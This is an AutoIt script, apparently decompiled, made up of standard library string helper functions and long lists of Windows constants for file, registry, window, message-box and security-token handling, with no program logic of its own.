Global Const $STR_NOCASESENSE = 0x0
Global Const $STR_CASESENSE = 0x1
Global Const $STR_NOCASESENSEBASIC = 0x2
Global Const $STR_STRIPLEADING = 0x1
Global Const $STR_STRIPTRAILING = 0x2
Global Const $STR_STRIPSPACES = 0x4
Global Const $STR_STRIPALL = 0x8
Global Const $STR_CHRSPLIT = 0x0
Global Const $STR_ENTIRESPLIT = 0x1
Global Const $STR_NOCOUNT = 0x2
Global Const $STR_REGEXPMATCH = 0x0
Global Const $STR_REGEXPARRAYMATCH = 0x1
Global Const $STR_REGEXPARRAYFULLMATCH = 0x2
Global Const $STR_REGEXPARRAYGLOBALMATCH = 0x3
Global Const $STR_REGEXPARRAYGLOBALFULLMATCH = 0x4
Global Const $STR_ENDISSTART = 0x0
Global Const $STR_ENDNOTSTART = 0x1
Global Const $SB_ANSI = 0x1
Global Const $SB_UTF16LE = 0x2
Global Const $SB_UTF16BE = 0x3
Global Const $SB_UTF8 = 0x4
Global Const $SE_UTF16 = 0x0
Global Const $SE_ANSI = 0x1
Global Const $SE_UTF8 = 0x2
Global Const $STR_UTF16 = 0x0
Global Const $STR_UCS2 = 0x1
Func _HexToString($shex)
    If Not (StringLeft($shex, 0x2) == "0x") Then $shex = "0x" & $shex
    Return BinaryToString($shex, $SB_UTF8)
EndFunc    ; -> _HexToString

Func _StringBetween($sstring, $sstart, $send, $imode = $STR_ENDISSTART, $bcase = False)
    $sstart = $sstart  ? "\\Q" & $sstart & "\\E"  : "\\A"
    If $imode <> $STR_ENDNOTSTART Then $imode = $STR_ENDISSTART
    If $imode = $STR_ENDISSTART Then
        $send = $send  ? "(?=\\Q" & $send & "\\E)"  : "\\z"
    Else
        $send = $send  ? "\\Q" & $send & "\\E"  : "\\z"
    EndIf
    If $bcase = Default Then
        $bcase = False
    EndIf
    Local $aret = StringRegExp($sstring, "(?s" & (Not $bcase  ? "i"  : '') & ")" & $sstart & "(.*?)" & $send, $STR_REGEXPARRAYGLOBALMATCH)
    If @error Then Return SetError(0x1, 0x0, 0x0)
    Return $aret
EndFunc    ; -> _StringBetween

Func _StringExplode($sstring, $sdelimiter, $ilimit = 0x0)
    If $ilimit = Default Then $ilimit = 0x0
    If $ilimit > 0x0 Then
        Local Const $NULL = Chr(0x0)
        $sstring = StringReplace($sstring, $sdelimiter, $NULL, $ilimit)
        $sdelimiter = $NULL
    ElseIf $ilimit < 0x0 Then
        Local $iindex = StringInStr($sstring, $sdelimiter, $STR_NOCASESENSEBASIC, $ilimit)
        If $iindex Then
            $sstring = StringLeft($sstring, $iindex + -1)
        EndIf
    EndIf
    Return StringSplit($sstring, $sdelimiter, BitOR($STR_ENTIRESPLIT, $STR_NOCOUNT))
EndFunc    ; -> _StringExplode

Func _StringInsert($sstring, $sinsertion, $iposition)
    Local $ilength = StringLen($sstring)
    $iposition = Int($iposition)
    If $iposition < 0x0 Then $iposition = $ilength + $iposition
    If $ilength < $iposition Or $iposition < 0x0 Then Return SetError(0x1, 0x0, $sstring)
    Return StringLeft($sstring, $iposition) & $sinsertion & StringRight($sstring, $ilength - $iposition)
EndFunc    ; -> _StringInsert

Func _StringProper($sstring)
    Local $bcapnext = True, $schr = '', $sreturn = ''
    Local $spattern = "[a-zA-ZÀ-ÿšœžŸ]"
    For $i = 0x1 To StringLen($sstring)
        $schr = StringMid($sstring, $i, 0x1)
        Select
        Case $bcapnext = True
            If StringRegExp($schr, $spattern) Then
                $schr = StringUpper($schr)
                $bcapnext = False
            EndIf
        Case Not StringRegExp($schr, $spattern)
            $bcapnext = True
        Case Else
            $schr = StringLower($schr)
        EndSelect
        $sreturn &= $schr
    Next
    Return $sreturn
EndFunc    ; -> _StringProper

Func _StringRepeat($sstring, $irepeatcount)
    $irepeatcount = Int($irepeatcount)
    If $irepeatcount = 0x0 Then Return ''
    If StringLen($sstring) < 0x1 Or $irepeatcount < 0x0 Then Return SetError(0x1, 0x0, '')
    Local $sresult = ''
    While $irepeatcount > 0x1
        If BitAND($irepeatcount, 0x1) Then $sresult &= $sstring
        $sstring &= $sstring
        $irepeatcount = BitShift($irepeatcount, 0x1)
    WEnd
    Return $sstring & $sresult
EndFunc    ; -> _StringRepeat

Func _StringTitleCase($sstring)
    Local $bcapnext = True, $schr = '', $sreturn = ''
    For $i = 0x1 To StringLen($sstring)
        $schr = StringMid($sstring, $i, 0x1)
        Select
        Case $bcapnext = True
            If StringRegExp($schr, "[a-zA-Z\\xC0-\\xFF0-9]") Then
                $schr = StringUpper($schr)
                $bcapnext = False
            EndIf
        Case Not StringRegExp($schr, "[a-zA-Z\\xC0-\\xFF'0-9]")
            $bcapnext = True
        Case Else
            $schr = StringLower($schr)
        EndSelect
        $sreturn &= $schr
    Next
    Return $sreturn
EndFunc    ; -> _StringTitleCase

Func _StringToHex($sstring)
    Return Hex(StringToBinary($sstring, $SB_UTF8))
EndFunc    ; -> _StringToHex

Global Const $OPT_COORDSRELATIVE = 0x0
Global Const $OPT_COORDSABSOLUTE = 0x1
Global Const $OPT_COORDSCLIENT = 0x2
Global Const $OPT_ERRORSILENT = 0x0
Global Const $OPT_ERRORFATAL = 0x1
Global Const $OPT_CAPSNOSTORE = 0x0
Global Const $OPT_CAPSSTORE = 0x1
Global Const $OPT_MATCHSTART = 0x1
Global Const $OPT_MATCHANY = 0x2
Global Const $OPT_MATCHEXACT = 0x3
Global Const $OPT_MATCHADVANCED = 0x4
Global Const $CCS_TOP = 0x1
Global Const $CCS_NOMOVEY = 0x2
Global Const $CCS_BOTTOM = 0x3
Global Const $CCS_NORESIZE = 0x4
Global Const $CCS_NOPARENTALIGN = 0x8
Global Const $CCS_NOHILITE = 0x10
Global Const $CCS_ADJUSTABLE = 0x20
Global Const $CCS_NODIVIDER = 0x40
Global Const $CCS_VERT = 0x80
Global Const $CCS_LEFT = 0x81
Global Const $CCS_NOMOVEX = 0x82
Global Const $CCS_RIGHT = 0x83
Global Const $DT_DRIVETYPE = 0x1
Global Const $DT_SSDSTATUS = 0x2
Global Const $DT_BUSTYPE = 0x3
Global Const $PROXY_IE = 0x0
Global Const $PROXY_NONE = 0x1
Global Const $PROXY_SPECIFIED = 0x2
Global Const $OBJID_WINDOW = 0x0
Global Const $OBJID_TITLEBAR = -2
Global Const $OBJID_SIZEGRIP = -7
Global Const $OBJID_CARET = -8
Global Const $OBJID_CURSOR = -9
Global Const $OBJID_ALERT = -10
Global Const $OBJID_SOUND = -11
Global Const $DLG_CENTERONTOP = 0x0
Global Const $DLG_NOTITLE = 0x1
Global Const $DLG_NOTONTOP = 0x2
Global Const $DLG_TEXTLEFT = 0x4
Global Const $DLG_TEXTRIGHT = 0x8
Global Const $DLG_MOVEABLE = 0x10
Global Const $DLG_TEXTVCENTER = 0x20
Global Const $MCID_UNKNOWN = + -1
Global Const $MCID_HAND = 0x0
Global Const $MCID_APPSTARTING = 0x1
Global Const $MCID_ARROW = 0x2
Global Const $MCID_CROSS = 0x3
Global Const $MCID_HELP = 0x4
Global Const $MCID_IBEAM = 0x5
Global Const $MCID_ICON = 0x6
Global Const $MCID_NO = 0x7
Global Const $MCID_SIZE = 0x8
Global Const $MCID_SIZEALL = 0x9
Global Const $MCID_SIZENESW = 0xa
Global Const $MCID_SIZENS = 0xb
Global Const $MCID_SIZENWSE = 0xc
Global Const $MCID_SIZEWE = 0xd
Global Const $MCID_UPARROW = 0xe
Global Const $MCID_WAIT = 0xf
Global Const $MCID_NONE = 0x10
Global Const $SD_LOGOFF = 0x0
Global Const $SD_SHUTDOWN = 0x1
Global Const $SD_REBOOT = 0x2
Global Const $SD_FORCE = 0x4
Global Const $SD_POWERDOWN = 0x8
Global Const $SD_FORCEHUNG = 0x10
Global Const $SD_STANDBY = 0x20
Global Const $SD_HIBERNATE = 0x40
Global Const $STDIN_CHILD = 0x1
Global Const $STDOUT_CHILD = 0x2
Global Const $STDERR_CHILD = 0x4
Global Const $STDERR_MERGED = 0x8
Global Const $STDIO_INHERIT_PARENT = 0x10
Global Const $RUN_CREATE_NEW_CONSOLE = 0x10000
Global Const $UBOUND_DIMENSIONS = 0x0
Global Const $UBOUND_ROWS = 0x1
Global Const $UBOUND_COLUMNS = 0x2
Global Const $MOUSEEVENTF_ABSOLUTE = 0x8000
Global Const $MOUSEEVENTF_MOVE = 0x1
Global Const $MOUSEEVENTF_LEFTDOWN = 0x2
Global Const $MOUSEEVENTF_LEFTUP = 0x4
Global Const $MOUSEEVENTF_RIGHTDOWN = 0x8
Global Const $MOUSEEVENTF_RIGHTUP = 0x10
Global Const $MOUSEEVENTF_MIDDLEDOWN = 0x20
Global Const $MOUSEEVENTF_MIDDLEUP = 0x40
Global Const $MOUSEEVENTF_WHEEL = 0x800
Global Const $MOUSEEVENTF_XDOWN = 0x80
Global Const $MOUSEEVENTF_XUP = 0x100
Global Const $REG_NONE = 0x0
Global Const $REG_SZ = 0x1
Global Const $REG_EXPAND_SZ = 0x2
Global Const $REG_BINARY = 0x3
Global Const $REG_DWORD = 0x4
Global Const $REG_DWORD_LITTLE_ENDIAN = 0x4
Global Const $REG_DWORD_BIG_ENDIAN = 0x5
Global Const $REG_LINK = 0x6
Global Const $REG_MULTI_SZ = 0x7
Global Const $REG_RESOURCE_LIST = 0x8
Global Const $REG_FULL_RESOURCE_DESCRIPTOR = 0x9
Global Const $REG_RESOURCE_REQUIREMENTS_LIST = 0xa
Global Const $REG_QWORD = 0xb
Global Const $REG_QWORD_LITTLE_ENDIAN = 0xb
Global Const $HWND_BOTTOM = 0x1
Global Const $HWND_NOTOPMOST = + -2
Global Const $HWND_TOP = 0x0
Global Const $HWND_TOPMOST = + -1
Global Const $SWP_NOSIZE = 0x1
Global Const $SWP_NOMOVE = 0x2
Global Const $SWP_NOZORDER = 0x4
Global Const $SWP_NOREDRAW = 0x8
Global Const $SWP_NOACTIVATE = 0x10
Global Const $SWP_FRAMECHANGED = 0x20
Global Const $SWP_DRAWFRAME = 0x20
Global Const $SWP_SHOWWINDOW = 0x40
Global Const $SWP_HIDEWINDOW = 0x80
Global Const $SWP_NOCOPYBITS = 0x100
Global Const $SWP_NOOWNERZORDER = 0x200
Global Const $SWP_NOREPOSITION = 0x200
Global Const $SWP_NOSENDCHANGING = 0x400
Global Const $SWP_DEFERERASE = 0x2000
Global Const $SWP_ASYNCWINDOWPOS = 0x4000
Global Const $KEYWORD_DEFAULT = 0x1
Global Const $KEYWORD_NULL = 0x2
Global Const $DECLARED_LOCAL = + -1
Global Const $DECLARED_UNKNOWN = 0x0
Global Const $DECLARED_GLOBAL = 0x1
Global Const $ASSIGN_CREATE = 0x0
Global Const $ASSIGN_FORCELOCAL = 0x1
Global Const $ASSIGN_FORCEGLOBAL = 0x2
Global Const $ASSIGN_EXISTFAIL = 0x4
Global Const $BI_ENABLE = 0x0
Global Const $BI_DISABLE = 0x1
Global Const $BREAK_ENABLE = 0x1
Global Const $BREAK_DISABLE = 0x0
Global Const $CDTRAY_OPEN = "open"
Global Const $CDTRAY_CLOSED = "closed"
Global Const $SEND_DEFAULT = 0x0
Global Const $SEND_RAW = 0x1
Global Const $DIR_DEFAULT = 0x0
Global Const $DIR_EXTENDED = 0x1
Global Const $DIR_NORECURSE = 0x2
Global Const $DIR_REMOVE = 0x1
Global Const $DT_ALL = "ALL"
Global Const $DT_CDROM = "CDROM"
Global Const $DT_REMOVABLE = "REMOVABLE"
Global Const $DT_FIXED = "FIXED"
Global Const $DT_NETWORK = "NETWORK"
Global Const $DT_RAMDISK = "RAMDISK"
Global Const $DT_UNKNOWN = "UNKNOWN"
Global Const $DT_UNDEFINED = 0x1
Global Const $DT_FAT = "FAT"
Global Const $DT_FAT32 = "FAT32"
Global Const $DT_EXFAT = "exFAT"
Global Const $DT_NTFS = "NTFS"
Global Const $DT_NWFS = "NWFS"
Global Const $DT_CDFS = "CDFS"
Global Const $DT_UDF = "UDF"
Global Const $DMA_DEFAULT = 0x0
Global Const $DMA_PERSISTENT = 0x1
Global Const $DMA_AUTHENTICATION = 0x8
Global Const $DS_UNKNOWN = "UNKNOWN"
Global Const $DS_READY = "READY"
Global Const $DS_NOTREADY = "NOTREADY"
Global Const $DS_INVALID = "INVALID"
Global Const $MOUSE_CLICK_LEFT = "left"
Global Const $MOUSE_CLICK_RIGHT = "right"
Global Const $MOUSE_CLICK_MIDDLE = "middle"
Global Const $MOUSE_CLICK_MAIN = "main"
Global Const $MOUSE_CLICK_MENU = "menu"
Global Const $MOUSE_CLICK_PRIMARY = "primary"
Global Const $MOUSE_CLICK_SECONDARY = "secondary"
Global Const $MOUSE_WHEEL_UP = "up"
Global Const $MOUSE_WHEEL_DOWN = "down"
Global Const $NUMBER_AUTO = 0x0
Global Const $NUMBER_32BIT = 0x1
Global Const $NUMBER_64BIT = 0x2
Global Const $NUMBER_DOUBLE = 0x3
Global Const $OBJ_NAME = 0x1
Global Const $OBJ_STRING = 0x2
Global Const $OBJ_PROGID = 0x3
Global Const $OBJ_FILE = 0x4
Global Const $OBJ_MODULE = 0x5
Global Const $OBJ_CLSID = 0x6
Global Const $OBJ_IID = 0x7
Global Const $EXITCLOSE_NORMAL = 0x0
Global Const $EXITCLOSE_BYEXIT = 0x1
Global Const $EXITCLOSE_BYCLICK = 0x2
Global Const $EXITCLOSE_BYLOGOFF = 0x3
Global Const $EXITCLOSE_BYSHUTDOWN = 0x4
Global Const $PROCESS_STATS_MEMORY = 0x0
Global Const $PROCESS_STATS_IO = 0x1
Global Const $PROCESS_LOW = 0x0
Global Const $PROCESS_BELOWNORMAL = 0x1
Global Const $PROCESS_NORMAL = 0x2
Global Const $PROCESS_ABOVENORMAL = 0x3
Global Const $PROCESS_HIGH = 0x4
Global Const $PROCESS_REALTIME = 0x5
Global Const $RUN_LOGON_NOPROFILE = 0x0
Global Const $RUN_LOGON_PROFILE = 0x1
Global Const $RUN_LOGON_NETWORK = 0x2
Global Const $RUN_LOGON_INHERIT = 0x4
Global Const $SOUND_NOWAIT = 0x0
Global Const $SOUND_WAIT = 0x1
Global Const $SHEX_OPEN = "open"
Global Const $SHEX_EDIT = "edit"
Global Const $SHEX_PRINT = "print"
Global Const $SHEX_PROPERTIES = "properties"
Global Const $TCP_DATA_DEFAULT = 0x0
Global Const $TCP_DATA_BINARY = 0x1
Global Const $UDP_OPEN_DEFAULT = 0x0
Global Const $UDP_OPEN_BROADCAST = 0x1
Global Const $UDP_DATA_DEFAULT = 0x0
Global Const $UDP_DATA_BINARY = 0x1
Global Const $UDP_DATA_ARRAY = 0x2
Global Const $TIP_NOICON = 0x0
Global Const $TIP_INFOICON = 0x1
Global Const $TIP_WARNINGICON = 0x2
Global Const $TIP_ERRORICON = 0x3
Global Const $TIP_BALLOON = 0x1
Global Const $TIP_CENTER = 0x2
Global Const $TIP_FORCEVISIBLE = 0x4
Global Const $WINDOWS_NOONTOP = 0x0
Global Const $WINDOWS_ONTOP = 0x1
Global Const $WIN_STATE_EXISTS = 0x1
Global Const $WIN_STATE_VISIBLE = 0x2
Global Const $WIN_STATE_ENABLED = 0x4
Global Const $WIN_STATE_ACTIVE = 0x8
Global Const $WIN_STATE_MINIMIZED = 0x10
Global Const $WIN_STATE_MAXIMIZED = 0x20
Global Const $FC_NOOVERWRITE = 0x0
Global Const $FC_OVERWRITE = 0x1
Global Const $FC_CREATEPATH = 0x8
Global Const $FT_MODIFIED = 0x0
Global Const $FT_CREATED = 0x1
Global Const $FT_ACCESSED = 0x2
Global Const $FT_ARRAY = 0x0
Global Const $FT_STRING = 0x1
Global Const $FT_MSEC = 0x2
Global Const $FT_UTC = 0x4
Global Const $FSF_CREATEBUTTON = 0x1
Global Const $FSF_NEWDIALOG = 0x2
Global Const $FSF_EDITCONTROL = 0x4
Global Const $FT_NONRECURSIVE = 0x0
Global Const $FT_RECURSIVE = 0x1
Global Const $FO_READ = 0x0
Global Const $FO_APPEND = 0x1
Global Const $FO_OVERWRITE = 0x2
Global Const $FO_CREATEPATH = 0x8
Global Const $FO_BINARY = 0x10
Global Const $FO_UNICODE = 0x20
Global Const $FO_UTF16_LE = 0x20
Global Const $FO_UTF16_BE = 0x40
Global Const $FO_UTF8 = 0x80
Global Const $FO_UTF8_NOBOM = 0x100
Global Const $FO_ANSI = 0x200
Global Const $FO_UTF16_LE_NOBOM = 0x400
Global Const $FO_UTF16_BE_NOBOM = 0x800
Global Const $FO_UTF8_FULL = 0x4000
Global Const $FO_FULLFILE_DETECT = 0x4000
Global Const $EOF = + -1
Global Const $FD_FILEMUSTEXIST = 0x1
Global Const $FD_PATHMUSTEXIST = 0x2
Global Const $FD_MULTISELECT = 0x4
Global Const $FD_PROMPTCREATENEW = 0x8
Global Const $FD_PROMPTOVERWRITE = 0x10
Global Const $CREATE_NEW = 0x1
Global Const $CREATE_ALWAYS = 0x2
Global Const $OPEN_EXISTING = 0x3
Global Const $OPEN_ALWAYS = 0x4
Global Const $TRUNCATE_EXISTING = 0x5
Global Const $INVALID_SET_FILE_POINTER = + -1
Global Const $FILE_BEGIN = 0x0
Global Const $FILE_CURRENT = 0x1
Global Const $FILE_END = 0x2
Global Const $FILE_ATTRIBUTE_READONLY = 0x1
Global Const $FILE_ATTRIBUTE_HIDDEN = 0x2
Global Const $FILE_ATTRIBUTE_SYSTEM = 0x4
Global Const $FILE_ATTRIBUTE_DIRECTORY = 0x10
Global Const $FILE_ATTRIBUTE_ARCHIVE = 0x20
Global Const $FILE_ATTRIBUTE_DEVICE = 0x40
Global Const $FILE_ATTRIBUTE_NORMAL = 0x80
Global Const $FILE_ATTRIBUTE_TEMPORARY = 0x100
Global Const $FILE_ATTRIBUTE_SPARSE_FILE = 0x200
Global Const $FILE_ATTRIBUTE_REPARSE_POINT = 0x400
Global Const $FILE_ATTRIBUTE_COMPRESSED = 0x800
Global Const $FILE_ATTRIBUTE_OFFLINE = 0x1000
Global Const $FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x2000
Global Const $FILE_ATTRIBUTE_ENCRYPTED = 0x4000
Global Const $FILE_SHARE_READ = 0x1
Global Const $FILE_SHARE_WRITE = 0x2
Global Const $FILE_SHARE_DELETE = 0x4
Global Const $FILE_SHARE_READWRITE = BitOR($FILE_SHARE_READ, $FILE_SHARE_WRITE)
Global Const $FILE_SHARE_ANY = BitOR($FILE_SHARE_READ, $FILE_SHARE_WRITE, $FILE_SHARE_DELETE)
Global Const $GENERIC_ALL = 0x10000000
Global Const $GENERIC_EXECUTE = 0x20000000
Global Const $GENERIC_WRITE = 0x40000000
Global Const $GENERIC_READ = -2147483648
Global Const $GENERIC_READWRITE = BitOR($GENERIC_READ, $GENERIC_WRITE)
Global Const $FILE_ENCODING_UTF16LE = 0x20
Global Const $FE_ENTIRE_UTF8 = 0x1
Global Const $FE_PARTIALFIRST_UTF8 = 0x2
Global Const $FN_FULLPATH = 0x0
Global Const $FN_RELATIVEPATH = 0x1
Global Const $FV_COMMENTS = "Comments"
Global Const $FV_COMPANYNAME = "CompanyName"
Global Const $FV_FILEDESCRIPTION = "FileDescription"
Global Const $FV_FILEVERSION = "FileVersion"
Global Const $FV_INTERNALNAME = "InternalName"
Global Const $FV_LEGALCOPYRIGHT = "LegalCopyright"
Global Const $FV_LEGALTRADEMARKS = "LegalTrademarks"
Global Const $FV_ORIGINALFILENAME = "OriginalFilename"
Global Const $FV_PRODUCTNAME = "ProductName"
Global Const $FV_PRODUCTVERSION = "ProductVersion"
Global Const $FV_PRIVATEBUILD = "PrivateBuild"
Global Const $FV_SPECIALBUILD = "SpecialBuild"
Global Const $FRTA_NOCOUNT = 0x0
Global Const $FRTA_COUNT = 0x1
Global Const $FRTA_INTARRAYS = 0x2
Global Const $FRTA_ENTIRESPLIT = 0x4
Global Const $FLTA_FILESFOLDERS = 0x0
Global Const $FLTA_FILES = 0x1
Global Const $FLTA_FOLDERS = 0x2
Global Const $FLTAR_FILESFOLDERS = 0x0
Global Const $FLTAR_FILES = 0x1
Global Const $FLTAR_FOLDERS = 0x2
Global Const $FLTAR_NOHIDDEN = 0x4
Global Const $FLTAR_NOSYSTEM = 0x8
Global Const $FLTAR_NOLINK = 0x10
Global Const $FLTAR_NORECUR = 0x0
Global Const $FLTAR_RECUR = 0x1
Global Const $FLTAR_NOSORT = 0x0
Global Const $FLTAR_SORT = 0x1
Global Const $FLTAR_FASTSORT = 0x2
Global Const $FLTAR_NOPATH = 0x0
Global Const $FLTAR_RELPATH = 0x1
Global Const $FLTAR_FULLPATH = 0x2
Global Const $PATH_ORIGINAL = 0x0
Global Const $PATH_DRIVE = 0x1
Global Const $PATH_DIRECTORY = 0x2
Global Const $PATH_FILENAME = 0x3
Global Const $PATH_EXTENSION = 0x4
Global Const $MB_OK = 0x0
Global Const $MB_OKCANCEL = 0x1
Global Const $MB_ABORTRETRYIGNORE = 0x2
Global Const $MB_YESNOCANCEL = 0x3
Global Const $MB_YESNO = 0x4
Global Const $MB_RETRYCANCEL = 0x5
Global Const $MB_CANCELTRYCONTINUE = 0x6
Global Const $MB_HELP = 0x4000
Global Const $MB_ICONNONE = 0x0
Global Const $MB_ICONSTOP = 0x10
Global Const $MB_ICONERROR = 0x10
Global Const $MB_ICONHAND = 0x10
Global Const $MB_ICONQUESTION = 0x20
Global Const $MB_ICONEXCLAMATION = 0x30
Global Const $MB_ICONWARNING = 0x30
Global Const $MB_ICONINFORMATION = 0x40
Global Const $MB_ICONASTERISK = 0x40
Global Const $MB_USERICON = 0x80
Global Const $MB_DEFBUTTON1 = 0x0
Global Const $MB_DEFBUTTON2 = 0x100
Global Const $MB_DEFBUTTON3 = 0x200
Global Const $MB_DEFBUTTON4 = 0x300
Global Const $MB_APPLMODAL = 0x0
Global Const $MB_SYSTEMMODAL = 0x1000
Global Const $MB_TASKMODAL = 0x2000
Global Const $MB_DEFAULT_DESKTOP_ONLY = 0x20000
Global Const $MB_RIGHT = 0x80000
Global Const $MB_RTLREADING = 0x100000
Global Const $MB_SETFOREGROUND = 0x10000
Global Const $MB_TOPMOST = 0x40000
Global Const $MB_SERVICE_NOTIFICATION = 0x200000
Global Const $MB_RIGHTJUSTIFIED = $MB_RIGHT
Global Const $IDTIMEOUT = + -1
Global Const $IDOK = 0x1
Global Const $IDCANCEL = 0x2
Global Const $IDABORT = 0x3
Global Const $IDRETRY = 0x4
Global Const $IDIGNORE = 0x5
Global Const $IDYES = 0x6
Global Const $IDNO = 0x7
Global Const $IDCLOSE = 0x8
Global Const $IDHELP = 0x9
Global Const $IDTRYAGAIN = 0xa
Global Const $IDCONTINUE = 0xb
Global Const $SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
Global Const $SE_AUDIT_NAME = "SeAuditPrivilege"
Global Const $SE_BACKUP_NAME = "SeBackupPrivilege"
Global Const $SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege"
Global Const $SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege"
Global Const $SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege"
Global Const $SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege"
Global Const $SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege"
Global Const $SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege"
Global Const $SE_DEBUG_NAME = "SeDebugPrivilege"
Global Const $SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege"
Global Const $SE_IMPERSONATE_NAME = "SeImpersonatePrivilege"
Global Const $SE_INC_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege"
Global Const $SE_INC_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege"
Global Const $SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege"
Global Const $SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege"
Global Const $SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege"
Global Const $SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege"
Global Const $SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege"
Global Const $SE_PROF_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege"
Global Const $SE_RELABEL_NAME = "SeRelabelPrivilege"
Global Const $SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege"
Global Const $SE_RESTORE_NAME = "SeRestorePrivilege"
Global Const $SE_SECURITY_NAME = "SeSecurityPrivilege"
Global Const $SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
Global Const $SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege"
Global Const $SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege"
Global Const $SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege"
Global Const $SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege"
Global Const $SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege"
Global Const $SE_TCB_NAME = "SeTcbPrivilege"
Global Const $SE_TIME_ZONE_NAME = "SeTimeZonePrivilege"
Global Const $SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege"
Global Const $SE_UNSOLICITED_INPUT_NAME = "SeUnsolicitedInputPrivilege"
Global Const $SE_UNDOCK_NAME = "SeUndockPrivilege"
Global Const $SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
Global Const $SE_PRIVILEGE_ENABLED = 0x2
Global Const $SE_PRIVILEGE_REMOVED = 0x4
Global Const $SE_PRIVILEGE_USED_FOR_ACCESS = -2147483648
Global Const $SE_GROUP_MANDATORY = 0x1
Global Const $SE_GROUP_ENABLED_BY_DEFAULT = 0x2
Global Const $SE_GROUP_ENABLED = 0x4
Global Const $SE_GROUP_OWNER = 0x8
Global Const $SE_GROUP_USE_FOR_DENY_ONLY = 0x10
Global Const $SE_GROUP_INTEGRITY = 0x20
Global Const $SE_GROUP_INTEGRITY_ENABLED = 0x40
Global Const $SE_GROUP_RESOURCE = 0x20000000
Global Const $SE_GROUP_LOGON_ID = -1073741824
Global Enum $TOKENPRIMARY = 0x1, $TOKENIMPERSONATION
Global Enum $SECURITYANONYMOUS = 0x0, $SECURITYIDENTIFICATION, $SECURITYIMPERSONATION, $SECURITYDELEGATION
Global Enum $TOKENUSER = 0x1, $TOKENGROUPS, $TOKENPRIVILEGES, $TOKENOWNER, $TOKENPRIMARYGROUP, $TOKENDEFAULTDACL, $TOKENSOURCE, $TOKENTYPE, $TOKENIMPERSONATIONLEVEL, $TOKENSTATISTICS, $TOKENRESTRICTEDSIDS, $TOKENSESSIONID, $TOKENGROUPSANDPRIVILEGES, $TOKENSESSIONREFERENCE, $TOKENSANDBOXINERT, $TOKENAUDITPOLICY, $TOKENORIGIN, $TOKENELEVATIONTYPE, $TOKENLINKEDTOKEN, $TOKENELEVATION, $TOKENHASRESTRICTIONS, $TOKENACCESSINFORMATION, $TOKENVIRTUALIZATIONALLOWED, $TOKENVIRTUALIZATIONENABLED, $TOKENINTEGRITYLEVEL, $TOKENUIACCESS, $TOKENMANDATORYPOLICY, $TOKENLOGONSID
Global Const $TOKEN_ASSIGN_PRIMARY = 0x1
Global Const $TOKEN_DUPLICATE = 0x2
Global Const $TOKEN_IMPERSONATE = 0x4
Global Const $TOKEN_QUERY = 0x8
Global Const $TOKEN_QUERY_SOURCE = 0x10
Global Const $TOKEN_ADJUST_PRIVILEGES = 0x20
Global Const $TOKEN_ADJUST_GROUPS = 0x40
Global Const $TOKEN_ADJUST_DEFAULT = 0x80
Global Const $TOKEN_ADJUST_SESSIONID = 0x100
Global Const $TOKEN_ALL_ACCESS = 0xf01ff
Global Const $TOKEN_READ = 0x20008
Global Const $TOKEN_WRITE = 0x200e0
Global Const $TOKEN_EXECUTE = 0x20000
Global Const $TOKEN_HAS_TRAVERSE_PRIVILEGE = 0x1
Global Const $TOKEN_HAS_BACKUP_PRIVILEGE = 0x2
Global Const $TOKEN_HAS_RESTORE_PRIVILEGE = 0x4
Global Const $TOKEN_HAS_ADMIN_GROUP = 0x8
Global Const $TOKEN_IS_RESTRICTED = 0x10
Global Const $TOKEN_SESSION_NOT_REFERENCED = 0x20
Global Const $TOKEN_SANDBOX_INERT = 0x40
Global Const $TOKEN_HAS_IMPERSONATE_PRIVILEGE = 0x80
Global Const $STANDARD_RIGHTS_DELETE = 0x10000
Global Const $READ_CONTROL = 0x20000
Global Const $WRITE_DAC = 0x40000
Global Const $WRITE_OWNER = 0x80000
Global Const $STANDARD_RIGHTS_SYNCHRONIZE = 0x100000
Global Const $ACCESS_SYSTEM_SECURITY = 0x1000000
Global Const $STANDARD_RIGHTS_REQUIRED = 0xf0000
Global Const $STANDARD_RIGHTS_READ = $READ_CONTROL
Global Const $STANDARD_RIGHTS_WRITE = $READ_CONTROL
Global Const $STANDARD_RIGHTS_EXECUTE = $READ_CONTROL
Global Const $STANDARD_RIGHTS_ALL = 0x1f0000
Global Const $SPECIFIC_RIGHTS_ALL = 0xffff
Global Enum $NOT_USED_ACCESS = 0x0, $GRANT_ACCESS, $SET_ACCESS, $DENY_ACCESS, $REVOKE_ACCESS, $SET_AUDIT_SUCCESS, $SET_AUDIT_FAILURE
Global Enum $TRUSTEE_IS_UNKNOWN = 0x0, $TRUSTEE_IS_USER, $TRUSTEE_IS_GROUP, $TRUSTEE_IS_DOMAIN, $TRUSTEE_IS_ALIAS, $TRUSTEE_IS_WELL_KNOWN_GROUP, $TRUSTEE_IS_DELETED, $TRUSTEE_IS_INVALID, $TRUSTEE_IS_COMPUTER
Global Const $LOGON_WITH_PROFILE = 0x1
Global Const $LOGON_NETCREDENTIALS_ONLY = 0x2
